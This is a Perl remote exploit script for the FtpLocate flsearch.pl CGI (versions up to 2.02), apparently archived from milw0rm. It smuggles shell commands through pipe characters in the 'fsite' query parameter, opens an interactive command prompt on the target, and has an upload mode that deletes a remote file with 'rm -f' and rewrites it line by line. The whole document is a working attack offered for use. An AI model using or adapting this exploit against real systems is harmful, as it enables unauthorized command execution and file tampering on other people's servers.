## Alot of code for a cgi | vuln. 
# /str0ke

#!/usr/bin/perl
#
# FtpLocate <= 2.02 (current) remote exploit
# VERY PRIVATE VERSION
# DO NOT DISTRIBUTE
#
# newbug Tseng [at] chroot.org
#

sub my_socket
{
       my $s=IO::Socket::INET->new(PeerAddr => $host,
                               PeerPort => 80,
                               Proto => "tcp") or die "socket: ";
}
sub ch2hex
{
       $chr = $_[0];
       $out="";
       for($i=0;$i<length($chr);$i++)
       {
               $ch = substr($chr,$i,1);

               if($ch eq "\"")
               {
                       $out.="%5c%22";
               }

               elsif($ch eq "\$")
               {
                       $out.="%5c%24";
               }
               elsif($ch eq "\@")
               {
                       $out.="%5c%40";
               }
               else
               {
                       $out.="%".sprintf("%2.2x",ord($ch));
               }
       }
       $out;
}
sub upload_file
{
       print "local file: ";
       chomp($lfile = <STDIN>);
       print "remote file: ";
       chomp($rfile = <STDIN>);

       my $socket = &my_socket($host);
       print $socket "GET $cgi?query=xx\&fsite=|rm%20-f%20$rfile| $junk";
       close $socket;
       print "remove $host:$rfile done.\n";

       my @DATA = `cat $lfile`;
       $num=1;
       $total = scalar @DATA;
       foreach $DATA (@DATA)
       {
               $DATA = &ch2hex($DATA);
               my $socket = &my_socket($host);
               print $socket "GET $cgi?query=xx\&fsite=|echo%20\"$DATA\"%20>>$rfile| $junk";
               print "Send lfile \"$lfile\" to $host:$rfile ... ($num/$total)\n";
               sleep(1);
               close $socket;
               $num++;
       }
}
use IO::Socket::INET;

print "FtpLocate flsearch.pl remote exploit\n";
print "host: ";
chomp ($host = <STDIN>);
print "port (80): ";
chomp ($port = <STDIN>);
if($port eq "")
{
       $port = 80;
}
print "version 1.0/1.1 (1.0): ";
chomp ($ver = <STDIN>);
if($ver eq "")
{
       $ver = "1.0";
}
print "cmd/upload (cmd): ";                                                     chomp ($opt = <STDIN>);
if($opt eq "")                                                                  {
       $opt = "cmd";
}
print "cgi path (/cgi-bin/ftplocate/flsearch.pl): ";
chomp ($cgi = <STDIN>);
if($cgi eq "")
{
       $cgi = "/cgi-bin/ftplocate/flsearch.pl";
}
if($ver eq "1.0")
{
       $junk = "HTTP/1.0\n\n";
}
else
{
       $junk = "HTTP/1.1\nHost: $host\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624 Netscape/7.1\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1\nAccept-Language: zh-tw,en-us;q=0.7,en;q=0.3\nAccept-Encoding: gzip,deflate\nAccept-Charset: Big5,utf-8;q=0.7,*;q=0.7\nKeep-Alive: 300\nConnection: keep-alive\n\n";                                        }
if($opt eq "cmd")
{
       while(1){
               print "h4ck3r\@[$host]:~\$ ";
               chomp ($cmd = <STDIN>);
               if($cmd ne "")
               {
                       print "Send command \"$cmd\" to $host ...\n";
                       $socket = &my_socket($host);
                       $cmd =~ s/\s/%20/g;

                       print $socket "GET $cgi?query=xx\&fsite=|$cmd| $junk";
                       print "done.\n";
               }
       }
}
elsif($opt eq "upload")
{
       &upload_file($lfile);
}
	print "done.\n";

# milw0rm.com [2005-07-25]
